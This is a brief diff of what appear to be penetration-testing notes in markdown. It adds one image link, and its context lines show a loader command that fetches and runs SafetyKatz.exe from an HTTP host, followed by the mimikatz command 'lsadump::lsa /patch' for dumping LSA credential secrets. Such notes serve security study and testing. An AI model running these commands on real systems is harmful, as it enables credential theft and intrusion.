@@ -346,3 +346,4 @@ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
 ```mimikatz
 lsadump::lsa /patch
 ```
+![[Pasted image 20231023111808.png]]
